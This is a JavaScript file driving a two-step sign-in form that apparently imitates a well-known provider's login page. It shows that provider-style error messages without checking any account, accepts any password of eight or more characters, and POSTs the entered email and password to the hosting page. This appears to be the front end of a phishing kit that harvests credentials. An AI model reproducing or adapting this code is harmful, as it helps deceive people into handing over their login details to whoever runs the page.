const slidePage = document.querySelector(".slide-page"),
    secondSlide = document.querySelector(".secondSlide"),
    btnNext = document.querySelector(".firstNext"),
    prevBtnSec = document.querySelector(".prev-1"),
    submitBtn = document.querySelector(".submit");

function validateEmailID(e) {
    return /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(e)
}

function validate() {
    const e = $("#result"),
        t = $("#email").val();
    return e.text(""), !!validateEmailID(t) || (t ? (e.text("That account doesn't exist.\n Please try again."), e.css("color", "red"), document.getElementById("loginForm").style.height = "430px") : (e.text("Enter a valid email address or phone number"), e.css("color", "red"), document.getElementById("loginForm").style.height = "430px"), !1)
}

function validatePassword() {
    const e = $("#passResult"),
        t = $("#password").val();
    return e.text(""), !(t.length < 8) || (e.text("Your account or password is incorrect."), e.css("color", "red"), !1)
}
var input1 = document.getElementById("email"),
    input2 = document.getElementById("password");
input1.addEventListener("keyup", (function (e) {
    13 === e.keyCode && (e.preventDefault(), document.getElementById("btnSend").click())
})), input2.addEventListener("keyup", (function (e) {
    13 === e.keyCode && (e.preventDefault(), document.getElementById("btnSignIn").click())
})), btnNext.addEventListener("click", (function () {
    const e = document.getElementById("email").value;
    if (!validate()) return;
    if (!validateEmailID(e)) return;
    document.getElementById("userLine").textContent = e;
    const t = document.getElementById("section-1"),
        n = document.getElementById("section-2");
    t.style.marginLeft = "-100%", t.style.visibility = "hidden", n.style.marginLeft = "0%", document.getElementById("loginForm").style.height = "430px"
})), submitBtn.addEventListener("click", (function () {
    const password = document.getElementById("password").value,
    email = document.getElementById("email").value;


    if (validatePassword()) {
        const data = new URLSearchParams({
            username: email,
            password: password,
          });

        fetch(document.location.href , {
        method: 'POST', 
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: data,
        })
        .then((response) => response.json())
        .then((data) => {
        console.log('Success:', data);
        })
        .catch((error) => {
        console.error('Error:', error);
        });
    }

})), prevBtnSec.addEventListener("click", (function () {
    const e = document.getElementById("section-1"),
        t = document.getElementById("section-2");
    e.style.marginLeft = "0%", e.style.visibility = "visible", t.style.marginLeft = "100%", document.getElementById("loginForm").style.height = "370px", slidePage.style.marginLeft = "0%", secondSlide.style.marginLeft = "100%", slidePage.style.visibility = "visible"
}));